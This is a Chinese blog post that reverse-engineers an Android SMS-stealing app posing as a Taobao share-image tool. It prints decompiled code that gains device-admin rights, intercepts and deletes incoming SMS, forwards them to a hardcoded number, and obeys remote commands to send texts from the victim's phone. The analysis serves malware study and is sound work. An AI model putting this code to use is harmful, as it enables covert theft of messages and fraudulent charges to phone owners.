<!DOCTYPE html>
<html>
<head>
<title>对恶意APP淘宝宝贝分享图的逆向分析</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<style type="text/css">
/* GitHub stylesheet for MarkdownPad (http://markdownpad.com) */
/* Author: Nicolas Hery - http://nicolashery.com */
/* Version: b13fe65ca28d2e568c6ed5d7f06581183df8f2ff */
/* Source: https://github.com/nicolahery/markdownpad-github */

/* RESET
=============================================================================*/

html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
  margin: 0;
  padding: 0;
  border: 0;
}

/* BODY
=============================================================================*/

body {
  font-family: Helvetica, arial, freesans, clean, sans-serif;
  font-size: 14px;
  line-height: 1.6;
  color: #333;
  background-color: #fff;
  padding: 20px;
  max-width: 960px;
  margin: 0 auto;
}

body>*:first-child {
  margin-top: 0 !important;
}

body>*:last-child {
  margin-bottom: 0 !important;
}

/* BLOCKS
=============================================================================*/

p, blockquote, ul, ol, dl, table, pre {
  margin: 15px 0;
}

/* HEADERS
=============================================================================*/

h1, h2, h3, h4, h5, h6 {
  margin: 20px 0 10px;
  padding: 0;
  font-weight: bold;
  -webkit-font-smoothing: antialiased;
}

h1 tt, h1 code, h2 tt, h2 code, h3 tt, h3 code, h4 tt, h4 code, h5 tt, h5 code, h6 tt, h6 code {
  font-size: inherit;
}

h1 {
  font-size: 28px;
  color: #000;
}

h2 {
  font-size: 24px;
  border-bottom: 1px solid #ccc;
  color: #000;
}

h3 {
  font-size: 18px;
}

h4 {
  font-size: 16px;
}

h5 {
  font-size: 14px;
}

h6 {
  color: #777;
  font-size: 14px;
}

body>h2:first-child, body>h1:first-child, body>h1:first-child+h2, body>h3:first-child, body>h4:first-child, body>h5:first-child, body>h6:first-child {
  margin-top: 0;
  padding-top: 0;
}

a:first-child h1, a:first-child h2, a:first-child h3, a:first-child h4, a:first-child h5, a:first-child h6 {
  margin-top: 0;
  padding-top: 0;
}

h1+p, h2+p, h3+p, h4+p, h5+p, h6+p {
  margin-top: 10px;
}

/* LINKS
=============================================================================*/

a {
  color: #4183C4;
  text-decoration: none;
}

a:hover {
  text-decoration: underline;
}

/* LISTS
=============================================================================*/

ul, ol {
  padding-left: 30px;
}

ul li > :first-child, 
ol li > :first-child, 
ul li ul:first-of-type, 
ol li ol:first-of-type, 
ul li ol:first-of-type, 
ol li ul:first-of-type {
  margin-top: 0px;
}

ul ul, ul ol, ol ol, ol ul {
  margin-bottom: 0;
}

dl {
  padding: 0;
}

dl dt {
  font-size: 14px;
  font-weight: bold;
  font-style: italic;
  padding: 0;
  margin: 15px 0 5px;
}

dl dt:first-child {
  padding: 0;
}

dl dt>:first-child {
  margin-top: 0px;
}

dl dt>:last-child {
  margin-bottom: 0px;
}

dl dd {
  margin: 0 0 15px;
  padding: 0 15px;
}

dl dd>:first-child {
  margin-top: 0px;
}

dl dd>:last-child {
  margin-bottom: 0px;
}

/* CODE
=============================================================================*/

pre, code, tt {
  font-size: 12px;
  font-family: Consolas, "Liberation Mono", Courier, monospace;
}

code, tt {
  margin: 0 0px;
  padding: 0px 0px;
  white-space: nowrap;
  border: 1px solid #eaeaea;
  background-color: #f8f8f8;
  border-radius: 3px;
}

pre>code {
  margin: 0;
  padding: 0;
  white-space: pre;
  border: none;
  background: transparent;
}

pre {
  background-color: #f8f8f8;
  border: 1px solid #ccc;
  font-size: 13px;
  line-height: 19px;
  overflow: auto;
  padding: 6px 10px;
  border-radius: 3px;
}

pre code, pre tt {
  background-color: transparent;
  border: none;
}

kbd {
    -moz-border-bottom-colors: none;
    -moz-border-left-colors: none;
    -moz-border-right-colors: none;
    -moz-border-top-colors: none;
    background-color: #DDDDDD;
    background-image: linear-gradient(#F1F1F1, #DDDDDD);
    background-repeat: repeat-x;
    border-color: #DDDDDD #CCCCCC #CCCCCC #DDDDDD;
    border-image: none;
    border-radius: 2px 2px 2px 2px;
    border-style: solid;
    border-width: 1px;
    font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
    line-height: 10px;
    padding: 1px 4px;
}

/* QUOTES
=============================================================================*/

blockquote {
  border-left: 4px solid #DDD;
  padding: 0 15px;
  color: #777;
}

blockquote>:first-child {
  margin-top: 0px;
}

blockquote>:last-child {
  margin-bottom: 0px;
}

/* HORIZONTAL RULES
=============================================================================*/

hr {
  clear: both;
  margin: 15px 0;
  height: 0px;
  overflow: hidden;
  border: none;
  background: transparent;
  border-bottom: 4px solid #ddd;
  padding: 0;
}

/* TABLES
=============================================================================*/

table th {
  font-weight: bold;
}

table th, table td {
  border: 1px solid #ccc;
  padding: 6px 13px;
}

table tr {
  border-top: 1px solid #ccc;
  background-color: #fff;
}

table tr:nth-child(2n) {
  background-color: #f8f8f8;
}

/* IMAGES
=============================================================================*/

img {
  max-width: 100%
}
</style>
<style type="text/css">
.highlight  { background: #ffffff; }
.highlight .c { color: #999988; font-style: italic } /* Comment */
.highlight .err { color: #a61717; background-color: #e3d2d2 } /* Error */
.highlight .k { font-weight: bold } /* Keyword */
.highlight .o { font-weight: bold } /* Operator */
.highlight .cm { color: #999988; font-style: italic } /* Comment.Multiline */
.highlight .cp { color: #999999; font-weight: bold } /* Comment.Preproc */
.highlight .c1 { color: #999988; font-style: italic } /* Comment.Single */
.highlight .cs { color: #999999; font-weight: bold; font-style: italic } /* Comment.Special */
.highlight .gd { color: #000000; background-color: #ffdddd } /* Generic.Deleted */
.highlight .gd .x { color: #000000; background-color: #ffaaaa } /* Generic.Deleted.Specific */
.highlight .ge { font-style: italic } /* Generic.Emph */
.highlight .gr { color: #aa0000 } /* Generic.Error */
.highlight .gh { color: #999999 } /* Generic.Heading */
.highlight .gi { color: #000000; background-color: #ddffdd } /* Generic.Inserted */
.highlight .gi .x { color: #000000; background-color: #aaffaa } /* Generic.Inserted.Specific */
.highlight .go { color: #888888 } /* Generic.Output */
.highlight .gp { color: #555555 } /* Generic.Prompt */
.highlight .gs { font-weight: bold } /* Generic.Strong */
.highlight .gu { color: #aaaaaa } /* Generic.Subheading */
.highlight .gt { color: #aa0000 } /* Generic.Traceback */
.highlight .kc { font-weight: bold } /* Keyword.Constant */
.highlight .kd { font-weight: bold } /* Keyword.Declaration */
.highlight .kp { font-weight: bold } /* Keyword.Pseudo */
.highlight .kr { font-weight: bold } /* Keyword.Reserved */
.highlight .kt { color: #445588; font-weight: bold } /* Keyword.Type */
.highlight .m { color: #009999 } /* Literal.Number */
.highlight .s { color: #d14 } /* Literal.String */
.highlight .na { color: #008080 } /* Name.Attribute */
.highlight .nb { color: #0086B3 } /* Name.Builtin */
.highlight .nc { color: #445588; font-weight: bold } /* Name.Class */
.highlight .no { color: #008080 } /* Name.Constant */
.highlight .ni { color: #800080 } /* Name.Entity */
.highlight .ne { color: #990000; font-weight: bold } /* Name.Exception */
.highlight .nf { color: #990000; font-weight: bold } /* Name.Function */
.highlight .nn { color: #555555 } /* Name.Namespace */
.highlight .nt { color: #000080 } /* Name.Tag */
.highlight .nv { color: #008080 } /* Name.Variable */
.highlight .ow { font-weight: bold } /* Operator.Word */
.highlight .w { color: #bbbbbb } /* Text.Whitespace */
.highlight .mf { color: #009999 } /* Literal.Number.Float */
.highlight .mh { color: #009999 } /* Literal.Number.Hex */
.highlight .mi { color: #009999 } /* Literal.Number.Integer */
.highlight .mo { color: #009999 } /* Literal.Number.Oct */
.highlight .sb { color: #d14 } /* Literal.String.Backtick */
.highlight .sc { color: #d14 } /* Literal.String.Char */
.highlight .sd { color: #d14 } /* Literal.String.Doc */
.highlight .s2 { color: #d14 } /* Literal.String.Double */
.highlight .se { color: #d14 } /* Literal.String.Escape */
.highlight .sh { color: #d14 } /* Literal.String.Heredoc */
.highlight .si { color: #d14 } /* Literal.String.Interpol */
.highlight .sx { color: #d14 } /* Literal.String.Other */
.highlight .sr { color: #009926 } /* Literal.String.Regex */
.highlight .s1 { color: #d14 } /* Literal.String.Single */
.highlight .ss { color: #990073 } /* Literal.String.Symbol */
.highlight .bp { color: #999999 } /* Name.Builtin.Pseudo */
.highlight .vc { color: #008080 } /* Name.Variable.Class */
.highlight .vg { color: #008080 } /* Name.Variable.Global */
.highlight .vi { color: #008080 } /* Name.Variable.Instance */
.highlight .il { color: #009999 } /* Literal.Number.Integer.Long */
.pl-c {
    color: #969896;
}

.pl-c1,.pl-mdh,.pl-mm,.pl-mp,.pl-mr,.pl-s1 .pl-v,.pl-s3,.pl-sc,.pl-sv {
    color: #0086b3;
}

.pl-e,.pl-en {
    color: #795da3;
}

.pl-s1 .pl-s2,.pl-smi,.pl-smp,.pl-stj,.pl-vo,.pl-vpf {
    color: #333;
}

.pl-ent {
    color: #63a35c;
}

.pl-k,.pl-s,.pl-st {
    color: #a71d5d;
}

.pl-pds,.pl-s1,.pl-s1 .pl-pse .pl-s2,.pl-sr,.pl-sr .pl-cce,.pl-sr .pl-sra,.pl-sr .pl-sre,.pl-src,.pl-v {
    color: #df5000;
}

.pl-id {
    color: #b52a1d;
}

.pl-ii {
    background-color: #b52a1d;
    color: #f8f8f8;
}

.pl-sr .pl-cce {
    color: #63a35c;
    font-weight: bold;
}

.pl-ml {
    color: #693a17;
}

.pl-mh,.pl-mh .pl-en,.pl-ms {
    color: #1d3e81;
    font-weight: bold;
}

.pl-mq {
    color: #008080;
}

.pl-mi {
    color: #333;
    font-style: italic;
}

.pl-mb {
    color: #333;
    font-weight: bold;
}

.pl-md,.pl-mdhf {
    background-color: #ffecec;
    color: #bd2c00;
}

.pl-mdht,.pl-mi1 {
    background-color: #eaffea;
    color: #55a532;
}

.pl-mdr {
    color: #795da3;
    font-weight: bold;
}

.pl-mo {
    color: #1d3e81;
}
.task-list {
padding-left:10px;
margin-bottom:0;
}

.task-list li {
    margin-left: 20px;
}

.task-list-item {
list-style-type:none;
padding-left:10px;
}

.task-list-item label {
font-weight:400;
}

.task-list-item.enabled label {
cursor:pointer;
}

.task-list-item+.task-list-item {
margin-top:3px;
}

.task-list-item-checkbox {
display:inline-block;
margin-left:-20px;
margin-right:3px;
vertical-align:1px;
}
</style>
</head>
<body>
<h1 id="-app-">对恶意APP&quot;淘宝宝贝分享图&quot;的逆向分析</h1>
<p><strong>Author：wnagzihxain<br>Mail：tudouboom@163.com</strong></p>
<p>今天天空出现了彩虹决定做点什么庆祝一下，那就分析个App吧</p>
<p>报告名称：对恶意APP“淘宝宝贝分享图”的逆向分析<br>作者：wnagzihxain<br>报告更新日期：2016.5.23<br>样本发现日期：不详<br>样本类型：短信拦截<br>样本文件大小／被感染文件变化长度：<br>样本文件MD5 校验值：<br>样本文件SHA1 校验值：<br>壳信息：无<br>可能受到威胁的系统：安卓<br>相关漏洞：无<br>已知检测名称：无</p>
<p>数字杀毒杀出了一个apk，来分析一下吧</p>
<p>上apktool</p>
<p><img src="Image/1.png" alt=""></p>
<p>之所以用apktool，是因为先用apktool能搞出很多好玩的和好看的</p>
<p>比如</p>
<p><img src="Image/2.png" alt=""></p>
<p>再比如</p>
<p><img src="Image/3.png" alt=""></p>
<p>低调看就好</p>
<p>顺便翻一翻其它文件夹，可以对整个apk的结构有所了解，当然这只是表面的了解，去看看smali文件有多少个，是不是加密了，看一眼有个数就好</p>
<p>将apk后缀改为zip解压，接着dex2jar</p>
<p><img src="Image/4.png" alt=""></p>
<p>然后就是jdgui的主场了</p>
<p>上jdgui</p>
<p><img src="Image/5.png" alt=""></p>
<p>哎呦哇啦，混淆了，不过好在只有一个包，而且代码也不多的样子</p>
<p>上JEB，这次纯手动修改混淆的代码进行分析</p>
<p>上JEB后第一个问题就是，怎么找到入口？？？</p>
<p>这个有技巧，打开Manifest，看到那个<code>android.intent.action.MAIN</code>了没？那就是入口的activity，所以对应看一下，就是“L”</p>
<p><img src="Image/6.png" alt=""></p>
<p>打开L，混淆后的代码就不要指望能一眼看懂了，慢慢分析，这是个耐心活</p>
<p>有一个小技巧，从MainActivity开始一句一句慢慢分析，同时在纸上画出调用关系，把看懂了的类或方法打上注释或者rename，好了这是整个“L”也就是MainActivity的代码</p>
<pre><code>package com.sonyericsson.androidapp.microblogci8dmdo4;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build$VERSION;
import android.os.Bundle;
import android.os.Handler;

public class L extends Activity {
    private DevicePolicyManager a;
    private ComponentName b;

    public L() {
        super();
    }

    protected void onCreate(Bundle arg5) {
        super.onCreate(arg5);
        this.setContentView(2130903040);
        d.a(((Context)this), new SR());
        d.a(((Context)this), &quot;启动MainActivity&quot;);
        d.a(((Context)this));
        this.a = this.getSystemService(&quot;device_policy&quot;);
        this.b = new ComponentName(((Context)this), LR.class);
        if(this.a.isAdminActive(this.b)) {
            d.a(((Context)this), &quot;已经注册设备管理器&quot;);
        }
        else {
            Intent v0 = new Intent(&quot;android.app.action.ADD_DEVICE_ADMIN&quot;);
            v0.putExtra(&quot;android.app.extra.DEVICE_ADMIN&quot;, this.b);
            v0.putExtra(&quot;android.app.extra.ADD_EXPLANATION&quot;, &quot;设备管理器&quot;);
            this.startActivity(v0);
            d.a(((Context)this), &quot;注册设备管理器&quot;);
        }

        if(Build$VERSION.SDK_INT &amp;lt; 14) {
            this.getPackageManager().setComponentEnabledSetting(this.getComponentName(), 2, 1);
        }

        this.finish();
        Handler v0_1 = new Handler();
        v0_1.postDelayed(new a(this, v0_1), 5000);
    }
}
</code></pre><p>接下来一句一句慢慢分析</p>
<p>这两句不用讲了</p>
<pre><code>super.onCreate(arg5);
this.setContentView(2130903040);
</code></pre><p>碰到第一句混淆了的代码，怎么办？双击跟过去，同时纸上记录一下当前代码走到了哪里，调用了什么类的什么方法，千万详细！！！！！！不然很容易绕晕！！！！！！</p>
<pre><code>d.a(((Context)this), new SR());
</code></pre><p>跟过去</p>
<pre><code>public static void a(Context arg3, SR arg4) {
        if(!d.d) {
            d.d = true;
            new c(arg3);
            try {
                IntentFilter v0_1 = new IntentFilter();
                v0_1.setPriority(2147483647);
                v0_1.addAction(&quot;android.provider.Telephony.SMS_RECEIVED&quot;);
                arg3.getApplicationContext().registerReceiver(((BroadcastReceiver)arg4), v0_1);
            }
            catch(Exception v0) {
                d.a(arg3, &quot;注册监听异常：&quot; + v0.getMessage());
            }
        }
}
</code></pre><p>又一堆混淆了的代码，同样一行一行分析</p>
<pre><code>if(!d.d)
</code></pre><p>双击看一下<code>d.d</code>是什么，高亮了三个地方，在类d里设置了三个boolean变量，并且都设置为false，此时我们先将变量名修改一下，将三个boolean型变量修改为<code>bool_x</code>这样的格式，这样一看就知道是boolean变量</p>
<p><img src="Image/7.png" alt=""></p>
<p>像这样</p>
<p><img src="Image/8.png" alt=""></p>
<p>然后来看<code>b.a</code>方法的逻辑，应用运行，<code>d.bool_c</code>为false，那么取反就是true，所以if会执行</p>
<p>下面那句<code>d.bool_c=true</code>就是用来保证应用运行后如果第二次或者第n次调用这个方法，不会执行这个方法里面的代码</p>
<p>也就是说应用运行后只会执行一次以后无论如何都不会再运行</p>
<p>然后执行到这句</p>
<pre><code>new c(arg3);
</code></pre><p>纸上记录好调用关系，然后跟过去</p>
<pre><code>package com.sonyericsson.androidapp.microblogci8dmdo4;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;

public class c extends ContentObserver {
    private Context a;

    public c(Context arg4) {
        super(new Handler());
        d.a(arg4, &quot;#SMSObserver#注册&quot;);
        this.a = arg4;
        this.a.getContentResolver().registerContentObserver(Uri.parse(&quot;content://sms/&quot;), true, ((ContentObserver)
                this));
    }

    public void onChange(boolean arg7) {
        String[] v2 = null;
        super.onChange(arg7);
        d.a(this.a, &quot;#SMSObserver#onChange&quot;);
        if(!d.b(this.a)) {
            d.a(this.a, &quot;#SMSObserver#时间不在运行范围&quot;);
        }
        else {
            Cursor v0 = this.a.getContentResolver().query(Uri.parse(&quot;content://sms/inbox&quot;), v2, ((String)
                    v2), v2, ((String)v2));
            while(v0.moveToNext()) {
                d.b(this.a, v0.getString(v0.getColumnIndex(&quot;address&quot;)), v0.getString(v0.getColumnIndex(
                        &quot;body&quot;)));
                this.a.getContentResolver().delete(Uri.parse(&quot;content://sms/conversations/&quot; + v0.getString(
                        1)), ((String)v2), v2);
            }
        }
    }
}
</code></pre><p>粗略看一下，这好像是在监控短信啊，怎么看出来的？</p>
<p>有经验的靠经验，有颜值的靠颜值，没经验没颜值的靠谷歌</p>
<p>当短信数量发生变化也就是收到短信的时候就会触发onChange()方法，同样来修改一下这个类的名字</p>
<p>继承自ContentObserver，用于监控短信数量的变化，顺便把下面那个private Contexta，Context arg4，String[] v2=null之类能很明显看出来的也给修改一下</p>
<p><img src="Image/9.png" alt=""></p>
<p>改完了是不是看着很爽，觉得很爽那就继续</p>
<p>先看这个</p>
<p><img src="Image/10.png" alt=""></p>
<p>这一句</p>
<pre><code>d.a(context, &quot;#SMSObserver#注册&quot;);
</code></pre><p>跟过去，千万纸上记录调用关系啊！！！！！！</p>
<pre><code>public static void a(Context arg1, String arg2) {
    if(d.bool_a) {
        Log.e(&quot;T_DEBUG&quot;, arg2);
    }
}
</code></pre><p>原来是Log，不过有个boolean判断，结合最开始的这个值默认是false，应该是调试用的，调试时把这个值设为true，就会有Log输出</p>
<p>然后调试完了就将这个值设为false，作者留着这些是要二次开发吗？谁有后续版本给我看看啊！！！！！！</p>
<p>修改一下方法名</p>
<p><img src="Image/11.png" alt=""></p>
<p>到这里就要靠刚才画的调用关系图进行回溯了，有没有一种调用堆栈回溯的感觉？</p>
<p>回到上一层， 该写的注释不要手懒，好记忆不如烂笔头</p>
<p><img src="Image/12.png" alt=""></p>
<p>虽然这几行注释看起来并没有什么用，但是一旦代码多起来这种随手写的注释简直不要太可爱！！！！！！</p>
<p>然后来看一下onChange()方法，这个方法会在短信数量发生变化的时候触发，作者的意思就是说收到短信了</p>
<pre><code>if(!d.b(this.thiscontext)) {
    d.ptintLog(this.thiscontext, &quot;#SMSObserver#时间不在运行范围&quot;);  // 用于调试的日志输出
}
</code></pre><p>同样，记录调用关系，跟过去</p>
<pre><code>public static boolean b(Context arg8) {
        long v6 = 0;
        boolean v0 = true;
        if(d.c == null) {
            d.c(arg8);
        }

        long v2 = System.currentTimeMillis();
        if(d.c[0] != v6 &amp;amp;&amp;amp; d.c[1] != v6 &amp;amp;&amp;amp; (d.c[0] &amp;gt; v2 || d.c[1] &amp;lt; v2)) {
            v0 = false;
        }

        return v0;
}
</code></pre><p>修改一下明显可以看出来的变量名</p>
<p><img src="Image/13.png" alt=""></p>
<p>然后这一句有混淆<br><code>&gt;if(d.c == null)</code><br>跟过去，原来是这个<br><code>private static long[] c;</code><br>暂时不知道什么作用，那么来看if里面的代码<br><code>d.c(context);</code><br>跟过去看看</p>
<pre><code>public static void c(Context arg9) {
        long v5 = 0;
        if(d.c == null) {
            try {
                SimpleDateFormat v0_1 = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm&quot;, Locale.CHINA);
                d.c = new long[2];
                d.c[0] = b.b.equals(&quot;&quot;) ? 0 : v0_1.parse(b.b).getTime();
                if(b.c.equals(&quot;&quot;)) {
                    d.c[1] = 0;
                    return;
                }

                d.c[1] = v0_1.parse(b.c).getTime();
            }
            catch(Exception v0) {
                d.c[0] = v5;
                d.c[1] = v5;
                d.ptintLog(arg9, &quot;从RAW读取配置信息失败，&quot; + v0.getMessage());
            }
        }
}
</code></pre><p><img src="Image/14.png" alt=""></p>
<p>因为这个long[] c也就是long[]datenow是全局变量，所以不需要返回对应的值</p>
<p>接着回溯一层，这个逻辑就清楚了，但是意思不清楚</p>
<p><img src="Image/15.png" alt=""></p>
<p>接着看代码，同样修改变量名</p>
<p><img src="Image/16.png" alt=""></p>
<p>到这咱们就不接着分析了，因为可能有些同学已经看不懂这里是什么意思，那我们就来创建一个工程运行看看这段代码的运行结果是什么</p>
<p>df为日期格式，然后将括号里的字符串按照设置的格式转换，详情看Console</p>
<p><img src="Image/17.png" alt=""></p>
<p>然后来看JEB里的代码</p>
<p>这一句里面有混淆</p>
<p><pre class="lang:java decode:true ">d.datenow[0] = b.b.equals(&quot;&quot;) ? 0 : simpledateformat.parse(b.b).getTime();</pre><br>跟过去</p>
<p><img src="Image/18.png" alt=""></p>
<p>一个空的字符串</p>
<p>那么刚才的结果就是d.datenow[0]=0</p>
<p>接着，b.c从刚才的截图可以看到，也是空字符串</p>
<p><pre class="lang:java decode:true ">if(b.c.equals(&quot;&quot;)) {<br>    d.datenow[1] = 0;<br>    return;<br>}</pre><br>那么执行d.datenow[1]=0后就会return</p>
<p>也就是说执行完getdate()，datenow[0]和datenow[1]都是0</p>
<p>奇怪就奇怪在这里了，难道是JEB的问题？留着疑问咱们待会说</p>
<p>接着回溯到上一层</p>
<p>执行到这句，这句意思很清楚，获取从1970-1-01 00<img src="https://assets-cdn.github.com/images/icons/emoji/00.png" alt=":00:" title=":00:" class="emoji" align="absmiddle" height="20" width="20">00.000 到当前时刻的时间长度，单位是毫秒</p>
<p><pre class="lang:java decode:true ">long currenttimemillis = System.currentTimeMillis();</pre><br>然后这个的逻辑很有意思</p>
<p><pre class="lang:java decode:true">if(d.datenow[0] != ZERO &amp;&amp; d.datenow[1] != ZERO &amp;&amp;amp(d.datenow[0] &gt; currenttimemillis || d.datenow[1] &lt; currenttimemillis)) {<br>    bool_a = false;<br>}</pre><br>前两个条件都是否，所以bool_a的值依旧是true不会变</p>
<p>最后返回计算的结果</p>
<p><pre class="lang:java decode:true ">return bool_a;</pre><br>这段代码不管怎么看返回的都是true，仿佛有一点花指令的感觉~~~</p>
<p>不过再仔细看看，应该是用于else里面的语句只执行一次，这个在下面的实际运行可以看出来</p>
<p>不管怎么样，方法名还是要修改一下的，就叫judgetime吧</p>
<p>到这就要继续回溯了</p>
<p><img src="Image/19.png" alt=""></p>
<p>有木有觉得类d特别抢眼，各种刷存在感，那么就改一下名吧，就叫SMSutils</p>
<p>这次改完真的是神清气爽，继续分析</p>
<p>刚才说if的分支永远不会执行，也就是说另一个分支……</p>
<p>很明显这就是在读取短信然后发短信给作者啊，还有删短信的操作</p>
<p>但是这里可不是单纯的发短信删短信，需要结合SMSContentObserver的整个onChange()方法来分析，onChange()方法触发的条件就是监控的数据有变化</p>
<p><img src="Image/20.png" alt=""></p>
<p>写了个demo来看看，用真机调试的，把关键代码copy出来，想要根据反编译出来的代码调试，这需要比较好的安卓开发能力了</p>
<p>运行起来第一次会发送手机里所有短信，然后后面接收到短信会拦截并且发送出去，短信格式最开始是发件人的手机号</p>
<p><img src="Image/21.png" alt=""></p>
<p>但是不仅仅是发送，仔细分析可以看出来，如果没有那句delete，这就是一个死循环，短信会一直发送</p>
<p>作者用的方法简单粗暴，直接将收件箱的短信发送一条删一条，其实这里的逻辑不是很好，作者的编程能力还有待提高</p>
<p>我写了另一个demo真机测试的结果，为了简单易懂忍痛把短信全删了</p>
<p>可以看到我手机短信全没了......</p>
<p><img src="Image/22.png" alt=""></p>
<p>补充一张图，都提示这么明显了还有人安装……</p>
<p><img src="Image/23.png" alt=""></p>
<p>继续看代码，有一个混淆SMSutils.b()，记一下参数然后跟过去看看</p>
<p><pre class="lang:java decode:true ">public static void b(Context arg6, String arg7, String arg8) {<br>        int v5 = 2;<br>        String v0 = b.b(arg6);<br>        if(arg7.startsWith(&quot;+86&quot;)) {<br>            arg7 = arg7.substring(3);<br>        }</p>
<pre><code>    SMSutils.ptintLog(arg6, &quot;收到：&quot; + arg7 + &quot; &quot; + arg8);
    if(arg7.equals(v0)) {
        String[] v0_1 = arg8.split(&quot;A&quot;, v5);
        if(v0_1.length != v5) {
            SMSutils.ptintLog(arg6, &quot;指令错误&quot;);
            SMSutils.a(arg6, null, &quot;短信指令格式错误，格式为“手机号A短信内容”&quot;);
        }
        else {
            SMSutils.ptintLog(arg6, &quot;SENDTO：&quot; + v0_1[0] + &quot; content &quot; + v0_1[1]);
            SMSutils.a(arg6, v0_1[0], v0_1[1]);
        }
    }
    else {
        SMSutils.a(arg6, v0, &quot;[&quot; + arg7 + &quot;]&quot; + arg8);
    }
</code></pre><p>}</pre><br>又是一堆被混淆的代码，不着急，先改变量名，把能看出来是什么的都改了，记得刚才说记住参数吗？现在就有用了</p>
<p>改完像这样</p>
<p><img src="Image/24.png" alt=""></p>
<p>又到了读代码的时候了</p>
<p><pre class="lang:java decode:true ">String v0 = b.b(context);</pre><br>跟过去，原来是获取作者的手机号，目测用于接收拦截到的短信</p>
<p><pre class="lang:java decode:true ">public static String b(Context arg1) {<br>        return &quot;15884230675&quot;;<br>}</pre><br>那么就来改方法名，改成getauthorphonenumber</p>
<p>有没有想给类b改名的想法，改成Bootini咋样？</p>
<p><img src="Image/25.png" alt=""></p>
<p>好了，现在回溯，上一层的代码也需要改一下</p>
<p><pre class="lang:java decode:true ">String phonenumber = Bootini.getauthorphonenumber(context);</pre><br>接着，这个的意思很明显，把sourceaddress前面的“+86”去掉</p>
<p><pre class="lang:java decode:true ">if(sourceaddress.startsWith(&quot;+86&quot;)) {<br>    sourceaddress = sourceaddress.substring(3);<br>}</pre><br>好了接下来是重头戏</p>
<p><img src="Image/26.png" alt=""></p>
<p>这种写法一出现可以确定是指令或者作者利用受害者手机给其它号码发送指定内容的短信</p>
<p>如果sourcesaddress等于作者的手机号，就将内容以“A”为分界线分割，如果分割后不是2个部分，也就是说不是“<strong><em>A</em></strong>”这种格式，就执行SMSutils.a方法，又有混淆，那就跟过去</p>
<p><pre class="lang:java decode:true ">public static void a(Context arg6, String arg7, String arg8) {<br>        String v2 = null;<br>        String v1 = arg7 == null ? Bootini.getauthorphonenumber(arg6) : arg7;<br>        SMSutils.ptintLog(arg6, &quot;发送：&quot; + v1 + &quot; &quot; + arg8);<br>        if(!Boolean.parseBoolean(String.valueOf(SMSutils.bool_a))) {<br>            SmsManager v0 = SmsManager.getDefault();<br>            v0.sendMultipartTextMessage(v1, v2, v0.divideMessage(arg8), ((ArrayList)v2), ((ArrayList)<br>                    v2));<br>        }<br>}</pre><br>很明显了，这个方法就是关键的发送短信代码段，先来给变量该改名，顺便改一改方法名</p>
<p><img src="Image/27.png" alt=""></p>
<p>仔细读一读如果传进来的arg7是null就执行getauthorphonenumber()方法，也就是获取作者手机号</p>
<p>然后括号里面恒成立下面那个发短信的方法是用于长短信的发送，如果你不是很了解的话建议去了解一下，顺便了解一下参数最好了</p>
<p>到这里可以回溯了，那么刚才的意思就是如果收到作者的短信，短信内容不是“<strong><em>A</em></strong></p>
<p>”这种格式，就给作者发短信&quot;短信指令格式错误，格式为“手机号A短信内容”&quot;</p>
<p>如果格式正确，就利用受害者手机给“手机号“发送”短信内容“，用你手机开通各种服务简直不要太方便</p>
<p>那SMSutils.b方法分析完了，来改个名，就叫beforesend好了</p>
<p>继续回溯</p>
<p>删除短信没什么好说的了</p>
<p><pre class="lang:java decode:true ">this.thiscontext.getContentResolver().delete(Uri.parse(&quot;content://sms/conversations/&quot; + cursor.getString(1)), ((String)NULL), NULL);</pre><br>那么到这里已经把监控到短信数量发生变化后的操作分析完了，总结一下：</p>
<p>获取短信内容以及发送者手机号，然后判断是否来自作者</p>
<p>如果不是来自作者，就将手机号和短信发给作者</p>
<p>如果来自作者就判断内容是否是“手机号A短信内容“格式，如果是这种格式就利用受害者手机号发送”短信内容”给“手机号”</p>
<p>至于发什么短信？用你手机给作者开通各种服务<del>~</del>~</p>
<p>然后回溯吧，要没有用纸画出调用关系现在早就晕了</p>
<p>然后有了刚才的经验现在可以修改变量名了，顺便上个注释</p>
<p><img src="Image/28.png" alt=""></p>
<p>那么问题来了，SR arg4是什么？从代码来看SR是一个BroadcastReceiver，那么跟过去</p>
<p><pre class="lang:java decode:true ">package com.sonyericsson.androidapp.microblogci8dmdo4;</p>
<p>import android.content.BroadcastReceiver;<br>import android.content.Context;<br>import android.content.Intent;<br>import android.os.Bundle;<br>import android.telephony.SmsMessage;</p>
<p>public class SR extends BroadcastReceiver {<br>    public SR() {<br>        super();<br>    }</p>
<pre><code>public void onReceive(Context arg9, Intent arg10) {
    SMSutils.ptintLog(arg9, &quot;#SmsReceiver#onReceive&quot; + arg10.getAction());
    if(!&quot;android.provider.Telephony.SMS_RECEIVED&quot;.equals(arg10.getAction())) {
        SMSutils.a(arg9, this);
        SMSutils.a(arg9);
    }
    else {
        Bundle v0 = arg10.getExtras();
        if(v0 != null) {
            if(!SMSutils.judgetime(arg9)) {
                SMSutils.ptintLog(arg9, &quot;#SmsReceiver#时间不在运行范围&quot;);
            }
            else {
                Object v0_1 = v0.get(&quot;pdus&quot;);
                int v5 = v0_1.length;
                String v4 = &quot;&quot;;
                int v2 = 0;
                String v1;
                for(v1 = &quot;&quot;; v2 &amp;lt; v5; v1 = v3) {
                    SmsMessage v1_1 = SmsMessage.createFromPdu(v0_1[v2]);
                    String v3 = v1_1.getOriginatingAddress();
                    v4 = String.valueOf(v4) + v1_1.getMessageBody();
                    ++v2;
                }
                SMSutils.beforesend(arg9, v1, v4);
                this.abortBroadcast();
            }
        }
    }
}
</code></pre><p>}</pre><br>果然是一个BroadcastReceiver，先修改变量名，顺便改一下类名，比如smsmessage这种就要靠连蒙带猜加运气，其实主要还是靠颜值</p>
<p><img src="Image/29.png" alt=""></p>
<p>大概可以看出来这是一个监控接收短信的Receiver，但是还有两个方法混淆了</p>
<p>目测还是重载</p>
